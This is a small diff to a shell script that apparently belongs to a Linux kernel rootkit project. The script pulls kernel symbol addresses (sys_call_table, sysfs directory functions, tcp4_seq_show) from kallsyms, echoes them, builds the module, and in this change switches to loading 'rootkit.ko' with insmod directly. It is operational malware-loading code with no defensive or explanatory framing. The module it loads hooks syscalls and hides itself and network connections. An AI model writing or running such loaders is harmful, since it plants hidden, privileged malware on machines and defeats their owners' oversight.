@@ -18,6 +18,7 @@ sysfs_remove_dir_addr=$(awk 'NR==2' kallsyms_addresses)
 sysfs_create_dir_ns_addr=$(awk 'NR==3' kallsyms_addresses)
 tcp4_seq_show_addr=$(awk 'NR==4' kallsyms_addresses)
 echo "xxxxxxxx"
+echo "addresses grom kallsyms:"
 echo "$sys_call_table_addr"
 echo "$sysfs_remove_dir_addr"
 echo "$sysfs_create_dir_ns_addr"
@@ -25,4 +26,4 @@ echo "$tcp4_seq_show_addr"
 echo "xxxxxxxx"
 #cat kallsyms_addresses
 make 
-#insmod rootkit.ko  sys_call_table_addr_str=sys_call_table_addr sysfs_remove_dir_addr_str=sysfs_remove_dir_addr sysfs_create_dir_ns_addr_str=sysfs_create_dir_ns_addr tcp4_seq_show_addr_str=tcp4_seq_show_addr
+insmod rootkit.ko
